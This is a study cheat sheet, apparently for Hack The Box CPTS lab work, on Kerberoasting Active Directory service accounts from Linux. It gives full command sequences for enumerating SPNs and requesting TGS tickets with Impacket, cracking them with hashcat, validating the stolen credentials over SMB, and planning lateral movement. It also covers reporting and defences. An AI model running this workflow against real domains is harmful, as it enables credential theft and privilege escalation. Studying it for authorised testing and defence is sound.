# Kerberoasting from Linux


> **Core chain:** `Domain user access → enumerate SPNs → request TGS → save $krb5tgs$ hash → crack offline → validate credentials → enumerate/use resulting access`

---

## 1. Kerberoasting in One Minute

### What is it?

Kerberoasting targets **user accounts that have Service Principal Names (SPNs)**.

An SPN maps a Kerberos service to the account that runs it. A domain user can request a **TGS (service ticket)** for an SPN. For traditional RC4-HMAC (`etype 23`) tickets, part of the ticket is encrypted using the service account's **NTLM-derived key**.

That gives us something we can take **offline** and crack without repeatedly authenticating to the domain.

### Important distinction

Getting a TGS **does NOT mean we are logged in as the service account**.

```text
SPN account exists
      ↓
Request TGS
      ↓
Obtain $krb5tgs$... hash
      ↓
Crack offline
      ↓
Cleartext password (if cracked)
      ↓
Authenticate as service account
      ↓
Check privileges / service access
```

### Why service accounts matter

Service accounts may have:

- Local Administrator rights on servers
- Access to applications/databases
- Membership in privileged groups
- Nested membership leading to elevated privileges
- Access to multiple systems

So the important question is not simply **"can I Kerberoast?"** but:

> **"Which SPN accounts can I crack, and what can that account access?"**

---

# 2. Prerequisites

From a Linux attack host, you generally need:

| Requirement | Example |
|---|---|
| Valid domain user credentials | `INLANEFREIGHT.LOCAL/forend` |
| Domain Controller IP | `172.16.5.5` |
| Domain name | `INLANEFREIGHT.LOCAL` |
| Network access to the DC/Kerberos | Usually TCP/UDP 88 + LDAP/SMB as needed |

The source material allows authentication using:

- Cleartext password
- NT hash
- Kerberos credentials/ticket

### Minimum mental model

```text
Kali/Linux
   │
   │ valid domain user
   ▼
Domain Controller
   │
   │ LDAP/Kerberos
   ▼
SPN account(s)
   │
   │ TGS-REP
   ▼
Offline hash cracking
```

---

# 3. Key Terms

| Term | Meaning |
|---|---|
| **AD** | Active Directory domain environment |
| **Kerberos** | AD's primary authentication protocol |
| **SPN** | Service Principal Name; identifies a service instance |
| **TGS** | Ticket Granting Service / service ticket obtained for a service |
| **TGS-REP** | Kerberos response containing the requested service ticket |
| **Service account** | Domain account running a service |
| **Kerberoasting** | Requesting service tickets and cracking them offline |
| **etype 23** | RC4-HMAC Kerberos; Hashcat mode `13100` for TGS-REP |

---

# 4. Typical SPNs to Notice

Common service types:

```text
MSSQLSvc/hostname:1433
HTTP/webserver
CIFS/fileserver
LDAP/host
FTP/host
backupjob/host
sts/domain
```

The most interesting entries are usually those where the SPN belongs to:

- A highly privileged account
- A member of `Domain Admins`
- A server/application service account
- An account likely reused across multiple hosts

### Example

```text
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433   sqldev   Domain Admins
```

This is far more interesting than finding an SPN on an ordinary low-privilege service account.

---

# 5. Install / Verify Impacket

Kali commonly already has Impacket installed.

### Check

```bash
GetUserSPNs.py -h
```

### Install from a cloned source tree

```bash
git clone https://github.com/fortra/impacket.git /opt/impacket
cd /opt/impacket
sudo python3 -m pip install .
```

> **Note:** Impacket's project has moved since older HTB material. On modern Kali, package names/versions and installation details may differ. The important command for this module is `GetUserSPNs.py`.

---

# 6. Main Tool — GetUserSPNs.py

### Help

```bash
GetUserSPNs.py -h
```

### Important syntax

```text
GetUserSPNs.py [options] DOMAIN/USERNAME[:PASSWORD]
```

### Most useful options

| Flag | Purpose |
|---|---|
| `-dc-ip <IP>` | Specify the Domain Controller IP |
| `-request` | Request TGS tickets for discovered SPN users |
| `-request-user <USER>` | Request a TGS for one specific user |
| `-outputfile <FILE>` | Save requested TGS hashes to a file |
| `-hashes LMHASH:NTHASH` | Authenticate with NTLM hash |
| `-no-pass` | Do not prompt for a password |
| `-k` | Use Kerberos authentication / credential cache |
| `-aesKey <HEX>` | Use AES key for Kerberos authentication |
| `-target-domain <DOMAIN>` | Target a specific domain |
| `-usersfile <FILE>` | Restrict/query using a supplied user list (tool/version dependent) |
| `-debug` | Verbose troubleshooting output |

---

# 7. Step 1 — Enumerate SPN Accounts

## Command

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

You will normally receive a password prompt.

### Expected output fields

```text
ServicePrincipalName   Name   MemberOf   PasswordLastSet   LastLogon   Delegation
```

### What to inspect

**1. `ServicePrincipalName`**

What service is running?

```text
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

**2. `Name`**

Which AD account owns the SPN?

```text
sqldev
```

**3. `MemberOf`**

This is often the most important field.

```text
CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

**4. `PasswordLastSet`**

Old passwords may be more interesting, especially if service accounts have not been rotated.

**5. `Delegation`**

Potentially relevant for broader Kerberos/delegation attacks.

---

# 8. Step 2 — Rank What to Roast First

### High-interest pattern

```text
SPN user
  ↓
Privileged group membership?
  ├─ Yes → prioritize
  └─ No
       ↓
Useful service?
  ├─ SQL / backup / management / app → investigate
  └─ ordinary service → lower priority
```

### Example table

| SPN user | Service | Privilege | Priority |
|---|---|---|---|
| `sqldev` | MSSQL | Domain Admins | Very interesting |
| `sqlqa` | MSSQL | Dev Accounts | Investigate |
| `adfs` | ADFS | Exchange-related group | Investigate |
| `backupagent` | Backup | Domain Admins | Very interesting |

> **Revision point:** Kerberoasting is not "find SPN = compromise." You must connect the SPN account to its actual privileges and access.

---

# 9. Step 3 — Request All TGS Tickets

## Command

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

This performs the workflow automatically:

```text
LDAP/domain query
   ↓
Find user accounts with SPNs
   ↓
Request TGS for each target
   ↓
Print $krb5tgs$ hashes
```

### What you are looking for

Lines resembling:

```text
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$...
```

### `$krb5tgs$23$` means

- `$krb5tgs$` → Kerberos TGS hash format
- `23` → RC4-HMAC / etype 23
- The rest contains the data needed by the cracking tool

---

# 10. Step 4 — Request One Specific TGS

When one account is particularly interesting, avoid requesting everything.

## Command

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

### Why target one user?

Useful when:

- One SPN account is highly privileged
- You want a cleaner output
- You want to reduce unnecessary requests
- You want to save only the interesting hash

---

# 11. Step 5 — Save the Ticket Hash

## Command

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend \
  -request-user sqldev \
  -outputfile sqldev_tgs
```

### Verify

```bash
cat sqldev_tgs
```

Or:

```bash
less sqldev_tgs
```

You want a line beginning similar to:

```text
$krb5tgs$23$*sqldev$...
```

---

# 12. Step 6 — Crack Offline with Hashcat

## Hashcat mode

```text
13100 = Kerberos 5, etype 23, TGS-REP
```

## Basic crack

```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

### Show recovered password later

```bash
hashcat -m 13100 sqldev_tgs --show
```

### Useful workflow

```bash
# Start cracking
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt

# Check result later
hashcat -m 13100 sqldev_tgs --show
```

### Expected success format

```text
$krb5tgs$23$*sqldev$...:database!
```

Meaning:

```text
TGS hash : cracked password
```

---

# 13. Password Cracking Escalation

If `rockyou.txt` fails, do not immediately assume Kerberoasting is useless.

Think in layers:

```text
rockyou.txt
    ↓ fail
Better wordlist / custom wordlist
    ↓
Rules / transformations
    ↓
Targeted candidates
    ↓
GPU cracking / longer attack
```

### Important reality

TGS tickets can be significantly slower to crack than simpler hash formats. A ticket can be perfectly valid but yield no password after a large cracking effort.

---

# 14. Step 7 — Validate the Recovered Credentials

Cracking the ticket is only half the job.

You now have:

```text
Username: sqldev
Password: database!
```

Validate that the credentials are actually usable.

### SMB validation with CrackMapExec (legacy HTB syntax)

```bash
sudo crackmapexec smb 172.16.5.5 -u sqldev -p 'database!'
```

### Modern alternative — NetExec

```bash
nxc smb 172.16.5.5 -u sqldev -p 'database!'
```

> **Why quote the password?** Special shell characters such as `!`, `$`, spaces, `;`, etc. can be interpreted by the shell. Quoting avoids accidental parsing.

### A successful authentication is NOT automatically Domain Admin

You must inspect the result and then verify group membership / actual access.

---

# 15. Step 8 — Determine What the Compromised Account Can Do

After recovering the password, immediately ask:

```text
Who is this user?
      ↓
What groups is it in?
      ↓
What hosts can it access?
      ↓
What services can it access?
      ↓
Does it have admin rights somewhere?
      ↓
Can it move laterally?
      ↓
Can it lead to further privilege escalation?
```

### Example paths

```text
Kerberoast
   ↓
SQL service account
   ↓
SQL access
   ↓
Database credentials / sensitive data
   ↓
xp_cmdshell / OS-level execution (where legitimately enabled)
```

Or:

```text
Kerberoast
   ↓
Service account
   ↓
Local Admin on multiple hosts
   ↓
Credential / token collection
   ↓
Lateral movement
```

Or:

```text
Kerberoast
   ↓
Privileged domain account
   ↓
Domain-level access
```

---

# 16. One-Command Workflow

### Enumerate SPNs

```bash
GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USER>
```

### Request every SPN TGS

```bash
GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USER> -request
```

### Request one account

```bash
GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USER> -request-user <SPN-USER>
```

### Request one account + save

```bash
GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USER> \
  -request-user <SPN-USER> \
  -outputfile <SPN-USER>_tgs
```

### Crack RC4 TGS-REP

```bash
hashcat -m 13100 <SPN-USER>_tgs /usr/share/wordlists/rockyou.txt
```

### Show cracked result

```bash
hashcat -m 13100 <SPN-USER>_tgs --show
```

### Validate over SMB

```bash
nxc smb <TARGET-IP> -u <USER> -p '<PASSWORD>'
```

---

# 17. Using an NT Hash Instead of a Password

Impacket can authenticate using an NT hash.

### Syntax

```bash
GetUserSPNs.py -dc-ip <DC-IP> \
  -hashes <LMHASH>:<NTHASH> \
  <DOMAIN>/<USER>
```

Example format:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 \
  -hashes aad3b435b51404eeaad3b435b51404ee:<NTHASH> \
  INLANEFREIGHT.LOCAL/forend
```

### Key point

For Impacket, you generally need the **NT hash**; a cleartext password is not mandatory for this workflow.

---

# 18. Kerberos Authentication / Existing Ticket

If you already have a Kerberos credential cache, `GetUserSPNs.py` can use Kerberos authentication.

### Useful flags

```bash
-k
```

or an AES key:

```bash
-aesKey <HEXKEY>
```

### Mental model

```text
Password/hash
   OR
Kerberos ccache / key
   ↓
Authenticate to domain
   ↓
Query SPNs
   ↓
Request TGS
```

> Exact Kerberos environment setup varies by lab. Do not confuse the TGT you use to authenticate with the TGS ticket obtained for the SPN.

---

# 19. What Makes a Kerberoastable Account Interesting?

Use this checklist every time.

```text
[ ] Has an SPN
[ ] Is a user account, not a normal machine account
[ ] Service account name is clear
[ ] PasswordLastSet is old
[ ] Account is in a privileged group
[ ] Account has local admin elsewhere
[ ] Account runs SQL / backup / management service
[ ] Account has access to sensitive applications/data
[ ] Password may be weak/reused
```

### Especially interesting

```text
SPN
+ Domain Admins
+ weak password
= potentially severe path
```

But always **verify the actual access** instead of assuming it.

---

# 20. Common Errors / Troubleshooting

## `[-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED`

Likely causes:

- Bad password
- Wrong credentials
- Authentication mismatch

Check:

```bash
GetUserSPNs.py -debug -dc-ip <DC-IP> <DOMAIN>/<USER>
```

---

## `[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN`

Likely:

- Wrong username
- Wrong domain
- Incorrect principal format

Check:

```text
DOMAIN/username
```

---

## Cannot contact the DC

Check network connectivity first:

```bash
ping -c 1 <DC-IP>
```

Then confirm the relevant services are reachable as appropriate for the lab.

Typical AD ports worth knowing:

```text
53    DNS
88    Kerberos
135   RPC
139   NetBIOS/SMB
389   LDAP
445   SMB
464   Kerberos password change
636   LDAPS
3268  Global Catalog
3269  Global Catalog over SSL
```

For Kerberoasting itself, the key protocol relationship is:

```text
LDAP → discover SPNs
Kerberos/88 → request service tickets
```

---

## `GetUserSPNs.py` returns no users

Possible reasons:

- No user SPNs were found
- Wrong domain/DC
- Credentials lack the required access for the query
- The SPNs exist on machine accounts rather than roastable user accounts
- Network/DNS/Kerberos configuration problem

Validate the domain information before changing tools.

---

## Hashcat says `Token length exception`

Usually the input is not in the expected format.

Check:

```bash
head -n 1 sqldev_tgs
```

You should see a Kerberos TGS hash beginning with something like:

```text
$krb5tgs$23$
```

---

## Hashcat finds nothing

That does **not** prove the ticket is invalid.

It may simply mean:

```text
Password not in wordlist
        OR
Password too strong
        OR
Attack strategy too weak
```

Try a better candidate strategy before discarding the finding.

---

# 21. Important Gotchas

### Gotcha #1 — SPN ≠ automatic compromise

An SPN only tells you a service is mapped to an account.

```text
SPN found
≠
Password cracked
≠
Admin access
```

---

### Gotcha #2 — Cracked password ≠ Domain Admin

A service account can be low privilege.

Always verify:

```text
groups
local admin rights
remote service access
application/database privileges
```

---

### Gotcha #3 — TGS is not the account password

The value you obtain is a **Kerberos ticket-derived crackable artifact**. You crack it offline to recover the password.

---

### Gotcha #4 — Check the account before cracking everything

Do not blindly request every ticket when one privileged account is already obvious.

Prefer:

```bash
-request-user <target>
```

when appropriate.

---

### Gotcha #5 — Ticket encryption type matters

This sheet's Hashcat mode:

```text
13100
```

is for **Kerberos 5 TGS-REP, etype 23 (RC4-HMAC)**.

Do not blindly use `13100` for every Kerberos ticket format. Inspect the hash type / tool output first.

---

# 22. Manual Reasoning — What Is Actually Happening?

### Protocol flow

```text
1. You have a valid domain user
          ↓
2. Query AD for SPNs
          ↓
3. Pick a user account with an SPN
          ↓
4. Ask the KDC for a service ticket for that SPN
          ↓
5. KDC returns TGS-REP
          ↓
6. Ticket contains data encrypted using the service account's key
          ↓
7. Export the crackable representation
          ↓
8. Crack offline
          ↓
9. Recover password
          ↓
10. Authenticate as service account
          ↓
11. Enumerate privileges and reachable services
```

### The key security weakness

The domain does not need to hand us the service account's password directly.

We only need a service ticket whose encryption depends on a key derived from that password. That allows **offline password guessing**.

---

# 23. CPTS Exam / Lab Decision Tree

```text
Got domain user creds?
        │
       YES
        │
        ▼
Identify DC
        │
        ▼
GetUserSPNs.py
        │
        ▼
Any user SPNs?
   ┌────┴────┐
  NO        YES
   │          │
   │          ▼
   │     Inspect MemberOf
   │          │
   │          ▼
   │   Interesting account?
   │       ┌───┴───┐
   │      YES     NO
   │       │       │
   │       ▼       ▼
   │  -request   Consider
   │  -request-   other AD
   │  user        paths
   │       │
   │       ▼
   │   Save TGS
   │       │
   │       ▼
   │  Hashcat -m 13100
   │       │
   │       ▼
   │    Cracked?
   │    ┌──┴──┐
   │   YES    NO
   │    │      │
   │    ▼      ▼
   │ Validate  Better
   │ creds     cracking
   │    │      strategy
   │    ▼
   │ Enumerate
   │ access
```

---

# 24. HTB Lab Template

Fill this out while working a box.

```text
DOMAIN: __________________________
DC IP: ___________________________
VALID USER: ______________________

SPN ACCOUNT: _____________________
SPN: _____________________________
SERVICE: _________________________
GROUPS / MEMBEROF: ______________
PASSWORD LAST SET: _______________

TGS FILE: ________________________
HASH TYPE: _______________________
HASHCAT MODE: ____________________

CRACKED PASSWORD: _________________

VALIDATION TARGET: ________________
ACCESS OBTAINED: _________________

NEXT PIVOT / ESCALATION PATH:
__________________________________
__________________________________
```

---

# 25. Report / Finding Notes

A useful Kerberoasting finding should distinguish **exposure** from **impact**.

### Record

```text
Affected account(s)
SPN(s)
Service(s)
Group membership
Password age
Whether TGS was obtained
Whether password was cracked
What access the cracked account provides
```

### Severity reasoning

Do not write:

```text
"Kerberoasting = Domain Admin"
```

Instead document the actual path:

```text
SPN discovered
   ↓
TGS obtained
   ↓
Password cracked / not cracked
   ↓
Account privileges verified
   ↓
Impact demonstrated
```

A crackable privileged service account is materially different from an SPN whose password could not be recovered and whose account has little access.

---

# 26. Blue-Team / Defensive Takeaways

Kerberoasting risk is reduced by controls such as:

- Strong, unique service-account passwords
- Regular credential rotation
- Managed service accounts / gMSAs where appropriate
- Avoiding unnecessary privileged group membership
- Least privilege for service accounts
- Monitoring unusual service-ticket request patterns
- Reducing use of legacy RC4 where practical and supported

### Defender mental model

```text
Weak service-account password
        +
User-readable SPN
        +
Over-privileged service account
        =
Kerberoasting risk
```

---

# 27. Quick Reference — Commands

```bash
# Enumerate SPNs
GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USER>

# Request all TGS tickets
GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USER> -request

# Request one user's ticket
GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USER> -request-user <TARGET>

# Request one user's ticket and save it
GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USER> \
  -request-user <TARGET> \
  -outputfile <TARGET>_tgs

# Authenticate with NT hash
GetUserSPNs.py -dc-ip <DC-IP> \
  -hashes <LMHASH>:<NTHASH> \
  <DOMAIN>/<USER>

# Use Kerberos authentication
GetUserSPNs.py -dc-ip <DC-IP> -k <DOMAIN>/<USER>

# Crack RC4 TGS-REP (etype 23)
hashcat -m 13100 <TARGET>_tgs /usr/share/wordlists/rockyou.txt

# Show cracked credentials
hashcat -m 13100 <TARGET>_tgs --show

# Validate recovered credentials
nxc smb <TARGET-IP> -u <USER> -p '<PASSWORD>'

# Legacy HTB command
sudo crackmapexec smb <TARGET-IP> -u <USER> -p '<PASSWORD>'
```

---

# 28. Memorize This

```text
Kerberoasting

1. Need valid domain-user access
2. Find user accounts with SPNs
3. Inspect privilege/group membership
4. Request a TGS
5. Extract $krb5tgs$ hash
6. Crack offline
7. Recover password if weak enough
8. Validate credentials
9. Enumerate what the account can actually access
10. Follow the resulting lateral-movement / privilege-escalation path
```

### The three commands to remember first

```bash
GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USER>
```

```bash
GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USER> -request-user <TARGET> -outputfile <TARGET>_tgs
```

```bash
hashcat -m 13100 <TARGET>_tgs /usr/share/wordlists/rockyou.txt
```

---

## Related HTB Topics

After Kerberoasting, the next useful concepts to connect are:

```text
Kerberos
├── SPNs
├── TGS / TGS-REP
├── AS-REP Roasting
├── Delegation
├── Unconstrained / Constrained Delegation
├── Resource-Based Constrained Delegation (RBCD)
├── Pass-the-Ticket
└── Silver Tickets
```

And for the resulting service account:

```text
Service account
├── Group membership
├── SMB
├── WinRM
├── MSSQL
├── Local Administrator rights
├── Credential reuse
└── Further domain enumeration
```
